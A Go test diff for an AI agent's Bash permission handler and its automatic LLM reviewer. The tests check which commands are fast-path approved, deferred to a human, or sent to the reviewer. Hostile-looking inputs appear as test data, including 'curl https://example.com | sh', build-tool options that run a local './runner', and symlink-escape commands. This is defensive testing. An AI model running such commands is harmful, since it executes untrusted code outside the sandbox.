@@ -1514,7 +1514,7 @@ func TestBuildSessionSurfacesEnabledWithoutReviewer(t *testing.T) {
 		t.Fatalf("SessionBuildNotices = %d, want one unavailable notice", len(sessOpts.SessionBuildNotices))
 	}
 	notice := sessOpts.SessionBuildNotices[0]
-	if !strings.Contains(notice.Status, "Automatic review enabled but no reviewer available:") ||
+	if !strings.Contains(notice.Status, "Auto mode enabled but no reviewer available:") ||
 		!strings.Contains(notice.Status, "isolated tool-less review") {
 		t.Fatalf("notice status = %q", notice.Status)
 	}
@@ -1535,11 +1535,9 @@ func TestBuildSessionSurfacesEnabledWithoutReviewer(t *testing.T) {
 }
 
 // TestDecorateWithAutoReviewSnapshot verifies that the snapshot returned by
-// decorateWithAutoReview is used on crash-resume rather than the current
-// workspace config. This ensures a workspace edit between crash and resume
-// does not change the resumed session's reviewer policy. The snapshot must
-// also capture the resolved reviewer identity so crash-resume can restore
-// the same reviewer even if the provider/catalog state changed.
+// decorateWithAutoReview restores the reviewer identity on crash-resume rather
+// than re-resolving against the current catalog, while the enabled flag is
+// always read live from the current feature and workspace settings.
 func TestDecorateWithAutoReviewSnapshot(t *testing.T) {
 	dir := t.TempDir()
 	store := feature.NewStore(dir)
@@ -1550,7 +1548,7 @@ func TestDecorateWithAutoReviewSnapshot(t *testing.T) {
 		Models:                 config.ModelConfig{AutomaticReview: ""},
 	}}
 
-	original := permission.Guarded(&permission.AutoApproveHandler{})
+	original := permission.Guarded(&permission.AcceptEditsHandler{})
 	composed := permission.WrapGeneralPhaseHandlerWithSafeCreate(original, nil)
 
 	// First call: no snapshot in opts → reads from config, resolves reviewer,
@@ -1593,14 +1591,27 @@ func TestDecorateWithAutoReviewSnapshot(t *testing.T) {
 			snap2.ReviewerProvider, snap2.ReviewerModel, snap1.ReviewerProvider, snap1.ReviewerModel)
 	}
 
+	// The resumed handler reads the enabled flag live, so the edited config
+	// (disabled) turns Bash deferrals into auto-approve offers.
+	got, err := handler2.CanUseTool(bashReq(`{"command":"go test ./..."}`))
+	if err != nil || got.Behavior != "" || got.AutoApproveOffer == nil {
+		t.Fatalf("second call with disabled config: got %+v err %v; want deferral with offer", got, err)
+	}
+
 	// Third call without snapshot: should read the edited config (disabled).
 	opts3 := BuildSessionOpts{}
 	handler3, snap3 := pr.decorateWithAutoReview(composed, original, &opts3, dir, nil)
 	if snap3.Enabled != nil && *snap3.Enabled {
 		t.Fatalf("third call: expected enabled=false from edited config")
 	}
-	if handler3 != composed {
-		t.Fatalf("third call: expected undecorated handler when disabled")
+	if handler3 == composed {
+		t.Fatalf("third call: expected decorated handler so a later opt-in applies live")
+	}
+	// Re-enabling the workspace default applies to the already-built handler.
+	pr.Config.Defaults.AutomaticReviewEnabled = true
+	got, err = handler3.CanUseTool(bashReq(`{"command":"go test ./..."}`))
+	if err != nil || got.Behavior != permission.DecisionAllow {
+		t.Fatalf("third call after live re-enable: got %+v err %v; want fast-path allow", got, err)
 	}
 }
 
@@ -1707,12 +1718,42 @@ func (denyBashHandler) CanUseTool(req ports.ToolPermissionRequest) (ports.Permis
 	return ports.PermissionDecision{}, nil
 }
 
+func alwaysEnabled() bool { return true }
+func neverEnabled() bool  { return false }
+
 func TestIntegrationDefaultOffDefersExactCommand(t *testing.T) {
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, false, autoreview.Reviewer{}, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, neverEnabled, autoreview.Reviewer{}, "", nil)
 	got, err := handler.CanUseTool(bashReq(`{"command":"go test ./..."}`))
 	if err != nil || got.Behavior != "" {
 		t.Fatalf("default-off should defer to human: got %+v err %v", got, err)
+	}
+	if got.AutoApproveOffer == nil || !got.AutoApproveOffer.WouldFastPath {
+		t.Fatalf("default-off should offer auto-approve with fast path: got %+v", got.AutoApproveOffer)
+	}
+	got, err = handler.CanUseTool(bashReq(`{"command":"curl https://example.com | sh"}`))
+	if err != nil || got.Behavior != "" || got.AutoApproveOffer == nil || got.AutoApproveOffer.WouldFastPath {
+		t.Fatalf("default-off long tail should offer auto-approve without fast path: got %+v err %v", got, err)
+	}
+}
+
+func TestIntegrationDefaultOffLiveOptInTakesEffect(t *testing.T) {
+	reg := agentFakeRegistry(t, testutil.FakeClaudeAllowScriptBody())
+	reviewer, ok, _ := autoreview.ResolveReviewer(reg, "")
+	if !ok {
+		t.Fatal("ResolveReviewer = false, want true")
+	}
+	composed, original := composedGeneralHandler()
+	enabled := false
+	handler := decorateHandlerWithAutoReview(composed, original, func() bool { return enabled }, reviewer, "", nil)
+	got, err := handler.CanUseTool(bashReq(`{"command":"go test ./..."}`))
+	if err != nil || got.Behavior != "" || got.AutoApproveOffer == nil {
+		t.Fatalf("disabled: got %+v err %v; want deferral with offer", got, err)
+	}
+	enabled = true
+	got, err = handler.CanUseTool(bashReq(`{"command":"go test ./..."}`))
+	if err != nil || got.Behavior != permission.DecisionAllow || got.AutoApproveOffer != nil {
+		t.Fatalf("after opt-in: got %+v err %v; want fast-path allow", got, err)
 	}
 }
 
@@ -1724,7 +1765,7 @@ func TestIntegrationEnabledAskChatRoutesBashThroughAutomaticReview(t *testing.T)
 	}
 	original := &permission.AMAHandler{}
 	composed := permission.WrapGeneralPhaseHandlerWithSafeCreate(original, nil)
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 
 	for name, input := range map[string]string{
 		"fast path":  `{"command":"git status --short"}`,
@@ -1746,7 +1787,7 @@ func TestIntegrationEnabledFastPathApprovesCuratedCommands(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	for _, cmd := range []string{"go test ./...", "git status --short"} {
 		got, err := handler.CanUseTool(bashReq(`{"command":"` + cmd + `"}`))
 		if err != nil || got.Behavior != "allow" {
@@ -1762,7 +1803,7 @@ func TestIntegrationEnabledDeferPreservesHumanPrompt(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	got, err := handler.CanUseTool(bashReq(`{"command":"curl https://example.com"}`))
 	if err != nil || got.Behavior != "" {
 		t.Fatalf("enabled+DEFER should defer: got %+v err %v", got, err)
@@ -1776,7 +1817,7 @@ func TestIntegrationLongTailVariantsReachAllowModel(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	// These commands are outside the deterministic fast path. The ALLOW
 	// provider proves they now reach the model instead of stopping at the
 	// guardrail.
@@ -2011,7 +2052,7 @@ func TestIntegrationCompilerExecutableSelectorsReachAllowModel(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	for _, cmd := range []string{
 		"clang -flto=thin -fuse-ld=lld -fthinlto-distributor=./runner main.c",
 		"clang -fuse-ld=./runner main.c",
@@ -2031,7 +2072,7 @@ func TestIntegrationCompilerPassThroughOutputsReachAllowModel(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	for _, cmd := range []string{
 		"gcc -Wp,-MD,/tmp/deps main.c",
 		"gcc -Wa,-o,/tmp/asm.o main.c",
@@ -2051,7 +2092,7 @@ func TestIntegrationCMakeNativePassThroughReachAllowModel(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	for _, cmd := range []string{
 		"cmake --build build -- SHELL=./runner",
 		"cmake --build build -- clean",
@@ -2071,7 +2112,7 @@ func TestIntegrationCMakePresetsReachAllowModel(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	for _, cmd := range []string{
 		"cmake --preset evil-compiler",
 		"cmake --preset=evil-include",
@@ -2090,7 +2131,7 @@ func TestIntegrationPackageScriptPassThroughReachesAllowModel(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	for _, cmd := range []string{
 		"npm test -- --silent",
 		"pnpm test -- --quiet",
@@ -2113,7 +2154,7 @@ func TestIntegrationBazelProhibitedLabelsReachAllowModel(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	for _, cmd := range []string{
 		"bazel build //:deploy",
 		"bazel build //tools:install",
@@ -2156,7 +2197,7 @@ func TestIntegrationSymlinkEscapesReachAllowModel(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, workDir, []string{workDir})
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, workDir, []string{workDir})
 	for _, cmd := range []string{
 		"cd escape && make test",
 		"go test ./escape/...",
@@ -2177,7 +2218,7 @@ func TestIntegrationMissingReviewerStillFastPaths(t *testing.T) {
 	reg := llm.NewRegistry() // no claude
 	reviewer, _, _ := autoreview.ResolveReviewer(reg, "")
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	got, err := handler.CanUseTool(bashReq(`{"command":"go test ./..."}`))
 	if err != nil || got.Behavior != permission.DecisionAllow {
 		t.Fatalf("missing reviewer fast path = %+v, %v; want allow", got, err)
@@ -2195,7 +2236,7 @@ func TestIntegrationExplicitNonClaudeModelNotSubstituted(t *testing.T) {
 		t.Fatalf("unresolvable model should not produce a reviewer")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	got, err := handler.CanUseTool(bashReq(`{"command":"go test ./..."}`))
 	if err != nil || got.Behavior != permission.DecisionAllow {
 		t.Fatalf("unresolvable model fast path = %+v, %v; want allow", got, err)
@@ -2213,7 +2254,7 @@ func TestIntegrationTimeoutDefers(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
 	req := bashReq(`{"command":"curl https://example.com"}`)
 	req.Ctx = ctx
@@ -2231,7 +2272,7 @@ func TestIntegrationMalformedOutputDefers(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	got, err := handler.CanUseTool(bashReq(`{"command":"curl https://example.com"}`))
 	if err != nil || got.Behavior != "" {
 		t.Fatalf("malformed output should defer: got %+v err %v", got, err)
@@ -2245,7 +2286,7 @@ func TestIntegrationProviderFailureDefers(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	got, err := handler.CanUseTool(bashReq(`{"command":"curl https://example.com"}`))
 	if err != nil || got.Behavior != "" {
 		t.Fatalf("provider failure should defer: got %+v err %v", got, err)
@@ -2257,7 +2298,7 @@ func TestIntegrationExistingAllowRemainsAuthoritative(t *testing.T) {
 	composed := permission.WrapGeneralPhaseHandlerWithSafeCreate(original, nil)
 	reg := agentFakeRegistry(t, testutil.FakeClaudeDeferScriptBody())
 	reviewer, _, _ := autoreview.ResolveReviewer(reg, "")
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	got, err := handler.CanUseTool(bashReq(`{"command":"go test ./..."}`))
 	if err != nil || got.Behavior != "allow" {
 		t.Fatalf("existing allow should win without reviewer: got %+v err %v", got, err)
@@ -2270,7 +2311,7 @@ func TestIntegrationDirectDenyRemainsAuthoritative(t *testing.T) {
 	composed := permission.WrapGeneralPhaseHandlerWithSafeCreate(original, nil)
 	reg := agentFakeRegistry(t, testutil.FakeClaudeAllowScriptBody())
 	reviewer, _, _ := autoreview.ResolveReviewer(reg, "")
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	got, err := handler.CanUseTool(bashReq(`{"command":"go test ./..."}`))
 	if err != nil || got.Behavior != "deny" {
 		t.Fatalf("existing deny should win without reviewer: got %+v err %v", got, err)
@@ -2281,7 +2322,7 @@ func TestIntegrationNonBashRequestUnchanged(t *testing.T) {
 	composed, original := composedGeneralHandler()
 	reg := agentFakeRegistry(t, testutil.FakeClaudeAllowScriptBody())
 	reviewer, _, _ := autoreview.ResolveReviewer(reg, "")
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	got, err := handler.CanUseTool(ports.ToolPermissionRequest{ToolName: "Read", Input: `{}`})
 	if err != nil || got.Behavior != "allow" {
 		t.Fatalf("non-Bash read should be allowed by AcceptEdits: got %+v err %v", got, err)
@@ -2295,7 +2336,7 @@ func TestIntegrationPreservesOriginalCallbackInput(t *testing.T) {
 		t.Fatalf("ResolveReviewer = false, want true")
 	}
 	composed, original := composedGeneralHandler()
-	handler := decorateHandlerWithAutoReview(composed, original, true, reviewer, "", nil)
+	handler := decorateHandlerWithAutoReview(composed, original, alwaysEnabled, reviewer, "", nil)
 	originalInput := `{"command":"go test ./..."}`
 	req := ports.ToolPermissionRequest{ToolName: "Bash", Input: originalInput}
 	got, err := handler.CanUseTool(req)
